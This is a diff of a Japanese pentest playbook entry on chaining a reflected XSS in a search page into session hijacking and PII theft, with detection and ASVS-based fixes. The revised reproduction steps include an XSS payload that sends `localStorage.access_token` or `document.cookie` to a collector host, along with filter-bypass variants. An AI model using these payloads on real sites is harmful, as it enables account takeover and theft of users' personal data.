@@ -1,89 +1,82 @@
 02_chains/xss-ref-sess-pii.md
 
-# Reflected XSS→Session乗っ取りでPII閲覧
+# Reflected XSSでセッション乗っ取りしPIIを流出させる
 **Tags:** family:xss / variant:ref / engine:- / pivot:sess / impact:pii  
-**Refs:** ASVS（V5 Output Encoding, V3 Session）・WSTG（Testing for Reflected XSS）・MITRE ATT&CK（Use Alternate Authentication Material (T1550.004)）・PortSwigger WSA（Reflected XSS）・PayloadsAllTheThings（XSS Injection）・HackTricks（XSS）  
+**Refs:** ASVS（Encoding/Sanitization・CSP）・WSTG（Reflected XSS）・MITRE ATT&CK（T1539・T1550.004）・PortSwigger WSA（Reflected XSS）・PayloadsAllTheThings（XSS Injection）・HackTricks（XSS）  
 **Trace:** created: 2025-10-07 / last-review: 2025-10-07 / owner: you
 
 ## 概要
-検索（Search）機能の反射型XSS（Reflected XSS）を起点に、被害者ブラウザで`document.cookie`や`window.name`等へアクセスし、`HttpOnly`不備などの条件下でセッショントークンを奪取。攻撃者は盗んだセッション（Use Alternate Authentication Material）を用いて本人になりすまし、個人情報（PII）閲覧に到達する。
+検索機能（Search）でユーザ入力がそのままHTMLに反映される反射型XSS（Reflected XSS）を起点に、被害者ブラウザで任意JSを実行し、セッションクッキーやBearerトークン（localStorage等）を窃取、あるいは被害者権限でPIIエンドポイントへ非対話リクエストを送らせ、個人情報（PII）を攻撃者へ送出する攻撃連鎖。
 
 ## 前提・境界（Non-Destructive）
-- ステージング環境／同意済み範囲のみ。第三者への配信や拡散は禁止。  
-- テストユーザのみ使用。実データ・本番アカウント・実トークンは使用しない（値は常に`****`で伏せる）。  
-- XSSは**最小限のペイロード**で確認し、持続化や大量リクエストは行わない。  
-- セッション再利用は**自己アカウントのクッキー**に限定。PIIはダミーデータで検証。
+- 対象は検証用/ステージング、テスト用アカウントのみ。大量送信・DoS・第三者配布は禁止。  
+- PII/トークンは表示例では必ず伏せ字（`****`）。実データの外部送信は禁止（自己ホストのダミー収集エンドポイント等で代替）。  
+- ブラウザ/拡張機能の自動保護（CSP/拡張）を迂回する試験は実施しない。  
 
 ## 入口（Initial Access）
-- 反射点：`/search?q=...`などのパラメータがHTML本文・属性・スクリプト文脈へ無害化（Encoding）なしで反映。  
-- 最小PoC（例：Cookie外送想定だが**実送信は行わず**リクエストのみで差分確認）：
+- 反射点：`/search?q=<payload>` が結果ページに無エスケープで混入。  
+- 最小PoC（無害確認）：  
 ```
-GET /search?q=%3Cscript%3E/*test*/document.title%3C/script%3E HTTP/1.1
-Host: app.example.com
+GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
+Host: target.example.com
 ```
-- 反射のレスポンス差分（例）：
-```
-HTTP/1.1 200 OK
-Content-Type: text/html; charset=UTF-8
-
-...
-<h2>Results for: <script>/*test*/document.title</script></h2>
-...
-```
-- 文脈判定（HTML/Attr/JS/URL）を行い、適切なコンテキストエンコーディング欠落を特定。
+- 文脈ごとの調整（例）：属性内→`"><svg onload=alert(1)>`、JS文字列内→`';alert(1);//`。  
 
 ## 横展開（Pivot / Privilege Escalation）
-- 条件：`HttpOnly`未設定や`document.cookie`等でセッショントークンが取得可能。  
-- 盗取したセッションを別ブラウザ／プロファイルで再利用（Use Alternate Authentication Material）。  
-- 最小差分例：PII APIに対するCookie再利用
-```
-GET /me/profile HTTP/1.1
-Host: app.example.com
-Cookie: session=****; Path=/; Secure
-```
-- 成功条件：本人UIの再現、`/me/profile`や`/orders`等の認可済みエンドポイントにアクセス可能。
+- セッション奪取（cookieがHttpOnlyでない場合）：`document.cookie` を読み取り、攻撃者管理の収集エンドポイントへ送信（ステージング限定）。  
+- トークン窃取：SPAで`localStorage.access_token`等を参照できる場合は同様に送信。  
+- セッションライディング：cookieがHttpOnlyでも、被害者権限で機能APIに`fetch()`を送らせPII（`/api/v1/users/me`,`/api/v1/export/csv`等）を取得→攻撃者へ送信。  
+- 管理系到達：権限不備があれば`/admin/*`参照やアカウント横取り（password reset CSRF連携）へ拡大。  
 
 ## 到達点（Impact）
-- 認可バイパスによるPII閲覧（氏名・メール・住所等）。  
-- 二次被害：権限高アカウントのセッション奪取時、より広範なデータアクセスに拡大。  
-- 信用失墜・インシデント報告義務・規制罰則（個人情報保護法・GDPR等）リスク。
+- 被害者アカウントの完全ななりすまし（MFA迂回の可能性）。  
+- 顧客名・住所・電話・メール等のPII、注文履歴、請求書CSVの流出。  
+- ビジネス側：不正注文・ポイント詐取・情報漏えい報告対応コスト増。  
 
 ## 検知・証跡（Detection & Evidence）
-- Web/Reverse Proxyアクセスログ：異常なクエリ（`<script>`や`onerror=`等）を検知。  
-  - 例：`2025-10-07T13:05:21+09:00 req_id=abc123 client=*** uri="/search?q=%3Cscript%3E..." ua="..."`  
-- アプリケーションログ：検索語の入力値・出力テンプレートのレンダリング例外、エラー。  
-- CSPレポート（`/csp-report`）：`script-src`違反のPOSTがあれば相関。  
-- WAF/シグネチャ：XSSパターン検知イベント（検出時刻JST・相関IDでトレース）。  
-- 期待アラート例：  
-  - 「Reflected-XSS 疑い：`/search`にスクリプト文脈の入力を検出（req_id=abc123）」  
-  - 「Session再利用疑い：短時間に異常な地理IPから同一`session_id`アクセス（sid_hash=****）」
+- アプリ/リバースプロキシログ：`/search` への不審クエリ（`<script`,`onerror=`,`javascript:` 等）。  
+- 監査ログ：被害者セッションIDでの短時間多量アクセス、IP/UA不一致。  
+- CSPレポート（`Content-Security-Policy-Report-Only` + `report-to`）：違反レポートに`blocked-uri`/`script-sample`が記録。  
+- 例（JST）：  
+  - `2025-10-07T14:21:03+09:00 request_id=abc123 path=/search q="%3Csvg%20onload%3Dfetch(...)" user=guest ip=****`  
+  - `2025-10-07T14:21:05+09:00 request_id=def456 path=/api/v1/export/csv user=alice session=**** size=524288`  
 
 ## 是正・防御（Fix / Defense）
-- **ASVS準拠のDoD（Definition of Done）**  
-  - **V5.3（Output Encoding）**：HTML/Attr/JS/URLの**文脈別**エンコーディングをテンプレート/ビュー層で強制。  
-  - **V5.1（Input Validation）**：検索語は文字種・長さの**許容リスト（Allowlist）**で制約。  
-  - **V3（Session Management）**：`HttpOnly`/`Secure`/`SameSite=Lax|Strict`付与。トークンはサーバ側で短寿命・ローテーション。  
-  - **V14（Configuration / HTTP Headers）**：**CSP**（`default-src 'none'; script-src 'self' 'nonce-<rnd>'; object-src 'none'`等）・`X-Content-Type-Options: nosniff`・`Referrer-Policy`。  
-  - **V9（Communication）**：TLS強制、Cookieは`Secure`必須。  
-- 追加対策：テンプレートエンジンの自動エスケープ有効化、静的解析/動的スキャンCI、危険API（`innerHTML`）使用禁則。
+- **出力エンコーディング**：テンプレートの自動エスケープを強制。HTML/属性/JS/URLの**文脈別（contextual）**エンコーディングを実装（ASVS v5.0.0-1.3.x）。  
+- **入力検証**：許可リスト（allowlist）＋正規化後の検証。危険シンボルの除去に依存しない（ASVS v5.0.0-1.1.x）。  
+- **DOM XSS対策**：`innerHTML`直書きを避け、`textContent`/`setAttribute`等を使用（ASVS v5.0.0-1.5.x）。  
+- **CSP**：`default-src 'none'; base-uri 'none'; object-src 'none'; script-src 'self' 'nonce-<runtime>'; connect-src 'self'; frame-ancestors 'none'` をベースに、ハッシュ/ノンスでインラインを許可（ASVS v5.0.0-3.4.6）。  
+- **セッション保護**：`Set-Cookie: HttpOnly; Secure; SameSite=Lax/Strict`、長寿命トークンをクッキーに集約（ASVS v5.0.0-2.1.x）。  
+- **認可**：機能/APIごとの権限確認を強制し、被害者権限でのデータ横取りを抑止（ASVS v5.0.0-4.x）。  
+- **監視**：CSP Report-To、WAFのXSSシグネチャ、PIIエクスポートの行動分析検知（ASVS v5.0.0-10.x）。  
 
 ## バリエーション
-- 反射点の違い：HTML本文／属性値／イベントハンドラ／`<script>`直下／URL/JS文字列。  
-- 入力媒体：クエリ、POSTフォーム、HTTPヘッダ（Referer/User-Agentの反射）、エラーメッセージ。  
-- 迂回：URLエンコード二重化、大小文字混在、テンプレート境界跨ぎ、JSONレスポンス→JS直列化。  
-- 防御不備の組合せ：`HttpOnly`欠落＋`SameSite=None`でクロスサイトからの奪取容易化。  
+- 反射文脈：プレーンHTML、属性、JS文字列、URLコンテキスト、テンプレート（CSTI連動）。  
+- フィルタ迂回：Unicode正規化、HTMLエンティティ二重化、イベントハンドラ/タグ多様化、`data:`/`blob:`等。  
+- 配信面：エラーページ、検索結果、プレビュー、パンくず/タイトル、JSONの`callback`（JSONP）。  
 
 ## 再現手順（Minimal Steps）
-1) （ステージング）テストユーザでログインし、`/search`に遷移。  
-2) `q`にミニマムペイロードを入力して反射点を確認：`<script>/*test*/document.title</script>`（ブロックされる場合は**中止**）。  
-3) 条件確認：レスポンス文脈／`Set-Cookie`属性（`HttpOnly`/`SameSite`）を記録。  
-4) 自己アカウントのブラウザで**同一ドメイン内**のデベロッパツールを開き、Cookie値（`session=****`）を控える（第三者送信はしない）。  
-5) 別プロファイルでCookieを設定し`/me/profile`へアクセス、PIIダミーデータの閲覧可否を確認。証跡（時刻JST・req_id・スクリーンショット）を保存。
+1) テストユーザでログインし、`/search?q=` の反射点を特定。  
+2) 最小PoCでJS実行を確認（例：`<script>alert(1)</script>`）。  
+3) **非破壊**な挙動確認：`fetch('/whoami')`等の自己参照APIで被害者権限実行を検証。  
+4) （ステージングのみ）`HttpOnly`無効や`localStorage`にトークンがある場合、マスクした形で収集先に送信テスト：  
+```
+GET /search?q=%3Cimg%20src%3Dx%20onerror%3Dfetch('https://collector.example.net/log?tok='%2bencodeURIComponent((localStorage.access_token||document.cookie||'none')))%3E
+```
+5) `export/csv`等のPIIエンドポイントに被害者権限でアクセスさせ、レスポンスサイズやHTTP 200を証跡として取得（外部送信は禁止）。  
 
 ## 参照
-1. OWASP ASVS v4.0.3 – V5 Input Validation & Encoding / V3 Session Management / V14 Configuration: https://owasp.org/ASVS/  
-2. OWASP Web Security Testing Guide – Testing for Reflected Cross-Site Scripting (XSS): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting  
-3. PortSwigger Web Security Academy – Reflected XSS: https://portswigger.net/web-security/cross-site-scripting/reflected  
-4. PayloadsAllTheThings – XSS Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection  
-5. HackTricks – XSS (Cross Site Scripting): https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting  
-6. MITRE ATT&CK – Use Alternate Authentication Material: Web Session Cookie (T1550.004): https://attack.mitre.org/techniques/T1550/004/
+1. OWASP ASVS 5.0.0（公式PDF。Encoding/Sanitization, CSP, Session等の要件群を参照）  
+   https://github.com/OWASP/ASVS/releases/download/v5.0.0/OWASP_Application_Security_Verification_Standard_5.0.0_en.pdf
+2. OWASP WSTG — Testing for Reflected Cross-Site Scripting  
+   https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting
+3. PortSwigger Web Security Academy — Reflected XSS  
+   https://portswigger.net/web-security/cross-site-scripting/reflected
+4. PayloadsAllTheThings — XSS Injection  
+   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+5. HackTricks — XSS (Cross Site Scripting)  
+   https://angelica.gitbook.io/hacktricks/pentesting-web/xss-cross-site-scripting
+6. MITRE ATT&CK — T1539 Steal Web Session Cookie  
+   https://attack.mitre.org/techniques/T1539/
+7. MITRE ATT&CK — T1550.004 Use Alternate Authentication Material: Web Session Cookie  
+   https://attack.mitre.org/techniques/T1550/004/
